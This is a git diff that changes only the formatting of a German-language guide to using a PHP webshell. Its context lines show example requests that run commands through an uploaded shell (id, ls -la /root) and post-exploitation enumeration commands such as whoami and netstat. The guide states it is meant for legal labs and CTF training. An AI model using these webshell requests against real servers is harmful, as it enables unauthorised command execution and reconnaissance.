@@ -1,7 +1,7 @@
 # 🐚 PHP Webshell – Usage & Enumeration Guide
 
 
----
+
 
 ## Inhaltsverzeichnis
 - [Einleitung](#einleitung)
@@ -12,7 +12,7 @@
 - [Siehe auch](#siehe-auch)
 - [Haftungsausschluss](#haftungsausschluss)
 
----
+
 
 ## Einleitung
 
@@ -21,7 +21,7 @@ Der Zugriff erfolgt über einen GET-Parameter `cmd`, der Systembefehle auf dem S
 
 > ⚠️ Hinweis: Diese Vorgehensweise dient ausschließlich Schulungs- und Testzwecken innerhalb legaler Testumgebungen oder CTF-Szenarien.
 
----
+
 
 ## Beispielhafte Webshell-Aufrufe
 
@@ -47,7 +47,7 @@ http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=ls -la /root
 http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=id
 ```
 
----
+
 
 <div align=right>
 
@@ -71,7 +71,7 @@ pwd             # aktuelles Verzeichnis
 whoami          # aktueller Benutzer
 ```
 
----
+
 
 ## Netzwerküberblick
 
@@ -86,7 +86,7 @@ netstat -l      # nur "listening" Ports
 netstat -lp     # mit Prozessinfos (sofern verfügbar)
 ```
 
----
+
 
 <div align=right>
 
@@ -109,14 +109,14 @@ netstat -lp     # mit Prozessinfos (sofern verfügbar)
 | `netstat`, `ss` | Netzwerkservices identifizieren |
 | `uname -a`      | Systemplattform identifizieren  |
 
----
+
 
 ## Siehe auch
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_rce_cheat_sheet.md](https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_rce_cheat_sheet.md)
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/injektionen/sql_injection_to_shell.md](https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/injektionen/sql_injection_to_shell.md)
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/04-os-enumeration/post_exploitation_tools.md](https://github.com/bitRaybytes/cybersecurity/blob/main/04-os-enumeration/post_exploitation_tools.md)
 
-----
+
 
 ## Haftungsausschluss
 
